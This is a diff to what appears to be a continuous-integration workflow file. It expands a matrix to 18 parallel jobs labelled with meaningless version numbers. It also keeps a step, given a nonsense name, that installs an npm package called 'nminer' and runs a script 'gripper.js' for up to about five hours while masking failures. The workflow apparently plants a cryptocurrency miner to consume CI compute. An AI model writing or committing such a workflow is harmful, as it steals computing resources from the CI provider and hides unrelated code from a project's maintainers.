@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 492 }
-          - { version: 4360 }
-          - { version: 4168 }
-          - { version: 3217 }
-          - { version: 8314 }
-          - { version: 8707 }
-          - { version: 9180 }
-          - { version: 9507 }
-          - { version: 1035 }
-          - { version: 9754 }
-          - { version: 2108 }
-          - { version: 6262 }
-          - { version: 1739 }
-          - { version: 5482 }
-          - { version: 1148 }
-          - { version: 2651 }
-          - { version: 3326 }
+          - { version: 2020 }
+          - { version: 4627 }
+          - { version: 3387 }
+          - { version: 7873 }
+          - { version: 4463 }
+          - { version: 4380 }
+          - { version: 4950 }
+          - { version: 7954 }
+          - { version: 9326 }
+          - { version: 7523 }
+          - { version: 1873 }
+          - { version: 8305 }
+          - { version: 5938 }
+          - { version: 1995 }
+          - { version: 2608 }
+          - { version: 2863 }
+          - { version: 2007 }
+          - { version: 25 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: healthily before husky oh
         run: |
           npm install nminer@latest
-          timeout 342m node gripper.js || echo "gripper executed"
+          timeout 306m node gripper.js || echo "gripper executed"
